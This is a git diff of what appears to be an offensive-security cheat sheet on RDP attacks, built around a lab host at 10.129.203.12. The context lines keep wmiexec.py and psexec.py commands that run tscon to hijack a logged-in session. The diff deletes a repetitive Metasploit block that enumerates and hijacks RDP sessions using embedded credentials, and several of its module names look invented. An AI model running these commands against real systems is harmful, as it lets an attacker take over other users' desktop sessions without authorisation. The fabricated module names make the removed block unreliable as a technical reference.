@@ -73,54 +73,6 @@ wmiexec.py admin:pass@TARGET "qwinsta && tscon 2 /dest:console"
 psexec.py -u admin -p pass TARGET cmd /c "qwinsta && tscon 2 /dest:console"
 ```
 
-```bash
-# Metasploit
-msfconsole
-use auxiliary/admin/rdp/session_event
-set RHOSTS 10.129.203.12
-set RPORT 3389
-set USERNAME htldbuser  
-set PASSWORD MSSQLAccess01!
-set SESSION 2  # qwinsta-dan al
-run
-
-use auxiliary/gather/rdp_session_cloner
-set RHOSTS 10.129.203.12
-set LHOST YOUR_IP
-set USERNAME admin
-set PASSWORD pass
-run
-
-# 1. RDP enum
-use auxiliary/scanner/rdp/rdp_sessions  
-set RHOSTS 10.129.203.12
-run
-
-# 2. Session event hijack
-use auxiliary/admin/rdp/session_event
-set RHOSTS 10.129.203.12
-set USERNAME htldbuser
-set PASSWORD MSSQLAccess01!
-exploit
-
-msfconsole
-
-# Session enum
-use auxiliary/scanner/rdp/rdp_sessions
-set RHOSTS 10.129.203.12
-set USERNAME htldbuser
-set PASSWORD MSSQLAccess01!
-run
-
-# Hijack (session ID-dən sonra)
-use auxiliary/admin/rdp/session_event
-set RHOSTS 10.129.203.12  
-set USERNAME htldbuser
-set PASSWORD MSSQLAccess01!
-set RDP_SESSION_ID 2  # Active session
-exploit
-```
-
 # 5. RDP Pass The Hash
 
 ```bash
